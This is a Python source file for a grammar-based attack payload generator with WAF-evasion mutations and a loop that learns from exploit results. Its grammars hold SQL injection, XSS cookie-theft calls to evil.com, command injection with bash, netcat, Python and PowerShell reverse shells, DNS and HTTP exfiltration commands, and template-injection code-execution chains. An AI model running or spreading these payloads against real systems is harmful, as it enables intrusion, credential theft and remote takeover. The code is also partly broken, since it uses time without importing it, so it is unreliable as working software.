"""
Dynamic Payload Generator with Grammar-Based Fuzzing
Addresses the gap in context-aware, mutating payload generation
"""

import random
import string
import re
import itertools
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import hashlib
import json

class PayloadGrammar:
    """Grammar-based payload generation engine"""
    
    def __init__(self):
        self.grammars = {
            'sqli': self._init_sqli_grammar(),
            'xss': self._init_xss_grammar(),
            'cmd': self._init_cmd_grammar(),
            'template': self._init_template_grammar()
        }
        self.mutation_rules = self._init_mutation_rules()
        
    def _init_sqli_grammar(self) -> Dict:
        """SQL injection grammar rules"""
        return {
            'root': ['<statement>'],
            'statement': [
                '<boolean_test>',
                '<union_select>',
                '<time_delay>',
                '<error_based>'
            ],
            'boolean_test': [
                "' <logic_op> '<comparison>'",
                '" <logic_op> "<comparison>"',
                '<number> <logic_op> <comparison>'
            ],
            'logic_op': ['OR', 'AND', '||', '&&'],
            'comparison': [
                "'1'='1",
                "'a'='a",
                '1=1',
                '2>1',
                'true',
                '(SELECT <aggregate> FROM <table> WHERE <condition>)'
            ],
            'union_select': [
                "' UNION SELECT <columns> FROM <table>--",
                "' UNION ALL SELECT <columns> FROM <table>/*",
                '" UNION SELECT <columns> FROM <table>#'
            ],
            'columns': [
                'NULL',
                'NULL,NULL',
                'NULL,NULL,NULL',
                '1,2,3',
                'username,password',
                '@@version,database(),user()'
            ],
            'table': [
                'users',
                'information_schema.tables',
                'mysql.user',
                'dual',
                'all_users'
            ],
            'time_delay': [
                "'; <sleep_func>--",
                '" OR <sleep_func>#',
                '1 AND <sleep_func>'
            ],
            'sleep_func': [
                'SLEEP(5)',
                "WAITFOR DELAY '0:0:5'",
                'pg_sleep(5)',
                'DBMS_LOCK.SLEEP(5)',
                'BENCHMARK(50000000,SHA1(1))'
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(<extract>,FLOOR(RAND(0)*2))x FROM <table> GROUP BY x)a)--",
                "' AND extractvalue(1,concat(0x7e,(<extract>),0x7e))--",
                "' AND updatexml(1,concat(0x7e,(<extract>),0x7e),1)--"
            ],
            'extract': [
                'version()',
                'database()',
                'user()',
                '(SELECT password FROM users LIMIT 1)',
                '(SELECT table_name FROM information_schema.tables LIMIT 1)'
            ],
            'aggregate': ['COUNT(*)', 'MAX(id)', 'MIN(id)'],
            'condition': ['1=1', 'username=\'admin\'', 'id>0'],
            'number': ['1', '2', '-1', '99999', '0']
        }
    
    def _init_xss_grammar(self) -> Dict:
        """XSS grammar rules"""
        return {
            'root': ['<vector>'],
            'vector': [
                '<script_tag>',
                '<event_handler>',
                '<svg_vector>',
                '<iframe_vector>',
                '<polyglot>'
            ],
            'script_tag': [
                '<script><alert_func></script>',
                '<script src=<external_js>></script>',
                '<SCRipt><alert_func></SCRipt>',
                '<<script>script><alert_func><<script>/script>'
            ],
            'event_handler': [
                '<tag> <event>=<js_code>',
                '<tag> <event>="<js_code>"',
                '<tag> <event>=\'<js_code>\'',
                '<tag> <event>=`<js_code>`'
            ],
            'tag': [
                'img',
                'body',
                'svg',
                'video',
                'audio',
                'marquee',
                'details'
            ],
            'event': [
                'onerror',
                'onload',
                'onclick',
                'onmouseover',
                'onfocus',
                'onanimationend',
                'onbeforescriptexecute'
            ],
            'alert_func': [
                'alert(1)',
                'alert(document.domain)',
                'prompt(1)',
                'confirm(1)',
                'console.log(1)',
                'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
            ],
            'js_code': [
                'alert(1)',
                'alert`1`',
                'alert(/XSS/)',
                'eval(atob("YWxlcnQoMSk="))',
                'fetch("//evil.com/"+document.cookie)',
                'new Image().src="//evil.com/"+document.cookie'
            ],
            'svg_vector': [
                '<svg onload=<js_code>>',
                '<svg><script><alert_func></script></svg>',
                '<svg><animate onbegin=<js_code> />',
                '<svg><set attributeName=onmouseover to=<js_code>>'
            ],
            'iframe_vector': [
                '<iframe src=javascript:<js_code>>',
                '<iframe srcdoc="<script><alert_func></script>">',
                '<iframe src="data:text/html,<script><alert_func></script>">'
            ],
            'polyglot': [
                'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
                '">\'><img src=xxx:x onerror=alert(1)>',
                '\'">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><img src="http://i.imgur.com/P8mL8.jpg">'
            ],
            'external_js': [
                '//evil.com/xss.js',
                'data:,alert(1)',
                '//⒈₨.ws'
            ]
        }
    
    def _init_cmd_grammar(self) -> Dict:
        """Command injection grammar rules"""
        return {
            'root': ['<injection>'],
            'injection': [
                '<separator> <command>',
                '<separator> <command> <separator>',
                '$(<command>)',
                '`<command>`',
                '${<command>}'
            ],
            'separator': [
                ';',
                '|',
                '||',
                '&',
                '&&',
                '\n',
                '\r\n',
                '%0a',
                '%0d%0a'
            ],
            'command': [
                '<recon_cmd>',
                '<exfil_cmd>',
                '<reverse_shell>'
            ],
            'recon_cmd': [
                'whoami',
                'id',
                'hostname',
                'pwd',
                'ls -la',
                'cat /etc/passwd',
                'ipconfig /all',
                'net user'
            ],
            'exfil_cmd': [
                'wget <callback_url>',
                'curl <callback_url>',
                'nslookup <data>.<callback_domain>',
                'ping -c 1 <data>.<callback_domain>',
                'certutil -urlcache -f <callback_url>'
            ],
            'reverse_shell': [
                'bash -i >& /dev/tcp/<ip>/<port> 0>&1',
                'nc <ip> <port> -e /bin/bash',
                'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
                'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'<ip>\',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
            ],
            'callback_url': [
                'http://evil.com/',
                'http://burpcollaborator.net/',
                'http://interact.sh/'
            ],
            'callback_domain': [
                'evil.com',
                'burpcollaborator.net',
                'interact.sh'
            ],
            'data': ['$(whoami)', '$(hostname)', '`cat /etc/passwd | base64`'],
            'ip': ['10.10.10.10', '127.0.0.1', 'LHOST'],
            'port': ['4444', '1337', '8080', '443']
        }
    
    def _init_template_grammar(self) -> Dict:
        """Template injection grammar rules"""
        return {
            'root': ['<template_expr>'],
            'template_expr': [
                '{{<expression>}}',
                '${<expression>}',
                '#{<expression>}',
                '<%=<expression>%>',
                '{%<expression>%}'
            ],
            'expression': [
                '<math_test>',
                '<code_exec>',
                '<file_read>'
            ],
            'math_test': [
                '7*7',
                '7*\'7\'',
                '{{7*7}}',
                '${7*7}'
            ],
            'code_exec': [
                'config.__class__.__init__.__globals__[\'os\'].popen(\'<command>\').read()',
                'request.application.__globals__.__builtins__.__import__(\'os\').popen(\'<command>\').read()',
                '\'\'.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\'sys\'].modules[\'os\'].popen(\'<command>\').read()',
                'product.getClass().forName(\'java.lang.Runtime\').getRuntime().exec(\'<command>\')'
            ],
            'file_read': [
                'open(\'/etc/passwd\').read()',
                'File.open(\'/etc/passwd\').read',
                'include(\'/etc/passwd\')',
                'file_get_contents(\'/etc/passwd\')'
            ],
            'command': ['id', 'whoami', 'ls', 'cat /etc/passwd']
        }
    
    def _init_mutation_rules(self) -> Dict:
        """Mutation rules for payload transformation"""
        return {
            'encoding': [
                self._url_encode,
                self._double_url_encode,
                self._unicode_encode,
                self._html_entity_encode,
                self._base64_encode,
                self._hex_encode
            ],
            'case_variation': [
                self._random_case,
                self._alternate_case,
                self._uppercase,
                self._lowercase
            ],
            'obfuscation': [
                self._add_comments,
                self._add_whitespace,
                self._string_concat,
                self._char_substitution
            ],
            'evasion': [
                self._waf_bypass_keywords,
                self._add_null_bytes,
                self._add_special_chars,
                self._chunking
            ]
        }
    
    def generate_from_grammar(self, vuln_type: str, depth: int = 3) -> str:
        """Generate payload from grammar rules"""
        if vuln_type not in self.grammars:
            return ""
        
        grammar = self.grammars[vuln_type]
        return self._expand_grammar(grammar, 'root', depth)
    
    def _expand_grammar(self, grammar: Dict, symbol: str, depth: int) -> str:
        """Recursively expand grammar rules"""
        if depth <= 0:
            return symbol
        
        if symbol.startswith('<') and symbol.endswith('>'):
            rule_name = symbol[1:-1]
            if rule_name in grammar:
                choice = random.choice(grammar[rule_name])
                
                # Find all symbols in the choice
                symbols = re.findall(r'<[^>]+>', choice)
                for sym in symbols:
                    replacement = self._expand_grammar(grammar, sym, depth - 1)
                    choice = choice.replace(sym, replacement, 1)
                
                return choice
        
        return symbol
    
    def mutate_payload(self, payload: str, mutation_types: List[str] = None) -> str:
        """Apply mutations to payload"""
        if not mutation_types:
            mutation_types = list(self.mutation_rules.keys())
        
        mutated = payload
        for mut_type in mutation_types:
            if mut_type in self.mutation_rules:
                mutation_func = random.choice(self.mutation_rules[mut_type])
                mutated = mutation_func(mutated)
        
        return mutated
    
    # Encoding functions
    def _url_encode(self, text: str) -> str:
        return ''.join(f'%{ord(c):02x}' if c not in string.ascii_letters + string.digits else c for c in text)
    
    def _double_url_encode(self, text: str) -> str:
        return self._url_encode(self._url_encode(text))
    
    def _unicode_encode(self, text: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _html_entity_encode(self, text: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in text)
    
    def _base64_encode(self, text: str) -> str:
        import base64
        return base64.b64encode(text.encode()).decode()
    
    def _hex_encode(self, text: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in text)
    
    # Case variation functions
    def _random_case(self, text: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _alternate_case(self, text: str) -> str:
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(text))
    
    def _uppercase(self, text: str) -> str:
        return text.upper()
    
    def _lowercase(self, text: str) -> str:
        return text.lower()
    
    # Obfuscation functions
    def _add_comments(self, text: str) -> str:
        if 'SELECT' in text.upper() or 'UNION' in text.upper():
            return text.replace(' ', '/**/')
        return text
    
    def _add_whitespace(self, text: str) -> str:
        whitespace = [' ', '\t', '\n', '\r']
        return text.replace(' ', random.choice(whitespace))
    
    def _string_concat(self, text: str) -> str:
        if 'alert' in text:
            return text.replace('alert', 'al'+'ert')
        return text
    
    def _char_substitution(self, text: str) -> str:
        substitutions = {
            ' ': ['+', '%20', '/**/'],
            '=': ['%3d', '%3D'],
            '/': ['%2f', '%2F'],
            '<': ['%3c', '%3C', '&lt;'],
            '>': ['%3e', '%3E', '&gt;']
        }
        
        for char, subs in substitutions.items():
            if char in text:
                text = text.replace(char, random.choice(subs))
        
        return text
    
    # Evasion functions
    def _waf_bypass_keywords(self, text: str) -> str:
        keywords = {
            'select': ['SeLeCt', 'SELECT', 'SElect'],
            'union': ['UnIoN', 'UNION', 'UNion'],
            'script': ['ScRiPt', 'SCRIPT', 'SCript'],
            'alert': ['AlErT', 'ALERT', 'ALert']
        }
        
        for keyword, variations in keywords.items():
            if keyword.lower() in text.lower():
                text = re.sub(keyword, random.choice(variations), text, flags=re.IGNORECASE)
        
        return text
    
    def _add_null_bytes(self, text: str) -> str:
        positions = random.sample(range(len(text)), min(3, len(text)))
        chars = list(text)
        for pos in sorted(positions, reverse=True):
            chars.insert(pos, '\x00')
        return ''.join(chars)
    
    def _add_special_chars(self, text: str) -> str:
        special = ['\x0b', '\x0c', '\x1c', '\x1d', '\x1e']
        return text.replace(' ', random.choice(special))
    
    def _chunking(self, text: str) -> str:
        chunk_size = random.randint(3, 7)
        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        return '+'.join(f"'{chunk}'" for chunk in chunks)


class DynamicPayloadEngine:
    """Main engine for dynamic payload generation"""
    
    def __init__(self):
        self.grammar = PayloadGrammar()
        self.history = {}
        self.success_patterns = {}
        self.failure_patterns = {}
        
    def generate_payload_variants(self, vuln_type: str, base_payload: str = None,
                                 count: int = 10, context: Dict = None) -> List[Dict]:
        """Generate multiple payload variants"""
        variants = []
        
        for _ in range(count):
            if base_payload:
                # Mutate existing payload
                payload = self._smart_mutate(base_payload, vuln_type, context)
            else:
                # Generate from grammar
                payload = self.grammar.generate_from_grammar(vuln_type)
            
            # Apply context-aware modifications
            if context:
                payload = self._apply_context(payload, context)
            
            # Apply learned patterns
            payload = self._apply_learned_patterns(payload, vuln_type)
            
            # Generate metadata
            variant = {
                'payload': payload,
                'vuln_type': vuln_type,
                'generation_method': 'mutation' if base_payload else 'grammar',
                'mutations_applied': self._get_applied_mutations(payload, base_payload),
                'confidence': self._calculate_confidence(payload, vuln_type),
                'hash': hashlib.md5(payload.encode()).hexdigest()
            }
            
            variants.append(variant)
        
        # Remove duplicates
        seen = set()
        unique_variants = []
        for v in variants:
            if v['hash'] not in seen:
                seen.add(v['hash'])
                unique_variants.append(v)
        
        # Sort by confidence
        unique_variants.sort(key=lambda x: x['confidence'], reverse=True)
        
        return unique_variants
    
    def _smart_mutate(self, payload: str, vuln_type: str, context: Dict = None) -> str:
        """Smart mutation based on vulnerability type and context"""
        
        # Determine mutation strategy
        if context and context.get('waf_detected'):
            mutations = ['encoding', 'evasion', 'obfuscation']
        elif vuln_type == 'sqli':
            mutations = ['case_variation', 'obfuscation']
        elif vuln_type == 'xss':
            mutations = ['encoding', 'case_variation']
        else:
            mutations = ['encoding']
        
        return self.grammar.mutate_payload(payload, mutations)
    
    def _apply_context(self, payload: str, context: Dict) -> str:
        """Apply context-specific modifications"""
        
        # Handle injection context
        if context.get('injection_point') == 'header':
            payload = payload.replace('\n', '\r\n')
        elif context.get('injection_point') == 'json':
            payload = payload.replace('"', '\\"')
        elif context.get('injection_point') == 'xml':
            payload = f'<![CDATA[{payload}]]>'
        
        # Handle encoding requirements
        if context.get('requires_encoding') == 'url':
            payload = self.grammar._url_encode(payload)
        elif context.get('requires_encoding') == 'base64':
            payload = self.grammar._base64_encode(payload)
        
        # Handle length restrictions
        max_length = context.get('max_length')
        if max_length and len(payload) > max_length:
            payload = self._compress_payload(payload, max_length)
        
        return payload
    
    def _apply_learned_patterns(self, payload: str, vuln_type: str) -> str:
        """Apply patterns learned from successful exploits"""
        
        if vuln_type in self.success_patterns:
            patterns = self.success_patterns[vuln_type]
            
            # Apply most successful pattern transformations
            for pattern in patterns[:3]:
                if pattern['transformation'] == 'prefix':
                    payload = pattern['value'] + payload
                elif pattern['transformation'] == 'suffix':
                    payload = payload + pattern['value']
                elif pattern['transformation'] == 'wrapper':
                    payload = pattern['value'].replace('PAYLOAD', payload)
        
        return payload
    
    def _get_applied_mutations(self, mutated: str, original: str = None) -> List[str]:
        """Identify which mutations were applied"""
        if not original:
            return []
        
        mutations = []
        
        if '%' in mutated and '%' not in original:
            mutations.append('url_encoding')
        
        if any(c.isupper() for c in mutated) and original.islower():
            mutations.append('case_variation')
        
        if '/**/' in mutated or '/*' in mutated:
            mutations.append('comment_injection')
        
        if '\\x' in mutated or '\\u' in mutated:
            mutations.append('hex_or_unicode')
        
        return mutations
    
    def _calculate_confidence(self, payload: str, vuln_type: str) -> float:
        """Calculate confidence score for payload"""
        confidence = 0.5
        
        # Check against successful patterns
        if vuln_type in self.success_patterns:
            for pattern in self.success_patterns[vuln_type]:
                if pattern['signature'] in payload:
                    confidence += 0.1
        
        # Check against failure patterns
        if vuln_type in self.failure_patterns:
            for pattern in self.failure_patterns[vuln_type]:
                if pattern['signature'] in payload:
                    confidence -= 0.1
        
        # Complexity bonus
        if len(set(payload)) > 20:
            confidence += 0.1
        
        # Length penalty for overly long payloads
        if len(payload) > 500:
            confidence -= 0.2
        
        return max(0.0, min(1.0, confidence))
    
    def _compress_payload(self, payload: str, max_length: int) -> str:
        """Compress payload to fit length restrictions"""
        if len(payload) <= max_length:
            return payload
        
        # Try to maintain payload integrity
        if 'UNION' in payload:
            # Shorten UNION payloads
            payload = payload.replace('NULL,', '').replace('NULL', 'N')
        
        if 'script' in payload.lower():
            # Shorten XSS payloads
            payload = payload.replace('alert(1)', '1')
            payload = payload.replace('document.', 'd.')
        
        # Last resort: truncate
        if len(payload) > max_length:
            payload = payload[:max_length-3] + '...'
        
        return payload
    
    def learn_from_result(self, payload: str, vuln_type: str, success: bool, context: Dict = None):
        """Learn from exploitation results"""
        
        # Extract patterns
        patterns = self._extract_patterns(payload)
        
        if success:
            if vuln_type not in self.success_patterns:
                self.success_patterns[vuln_type] = []
            
            self.success_patterns[vuln_type].extend(patterns)
            
            # Limit pattern storage
            self.success_patterns[vuln_type] = self.success_patterns[vuln_type][-100:]
        else:
            if vuln_type not in self.failure_patterns:
                self.failure_patterns[vuln_type] = []
            
            self.failure_patterns[vuln_type].extend(patterns)
            self.failure_patterns[vuln_type] = self.failure_patterns[vuln_type][-100:]
        
        # Store in history
        self.history[hashlib.md5(payload.encode()).hexdigest()] = {
            'payload': payload,
            'vuln_type': vuln_type,
            'success': success,
            'context': context,
            'timestamp': time.time()
        }
    
    def _extract_patterns(self, payload: str) -> List[Dict]:
        """Extract reusable patterns from payload"""
        patterns = []
        
        # Extract encoding patterns
        if '%' in payload:
            patterns.append({
                'signature': re.search(r'(%[0-9a-fA-F]{2})+', payload).group(),
                'transformation': 'encoding',
                'value': 'url'
            })
        
        # Extract wrapper patterns
        if payload.startswith("'") and payload.endswith("'"):
            patterns.append({
                'signature': "'",
                'transformation': 'wrapper',
                'value': "'PAYLOAD'"
            })
        
        # Extract prefix/suffix patterns
        if payload.startswith(("OR ", "AND ", "' OR")):
            prefix = payload[:10]
            patterns.append({
                'signature': prefix,
                'transformation': 'prefix',
                'value': prefix
            })
        
        return patterns


# Export the main engine
dynamic_payload_engine = DynamicPayloadEngine()
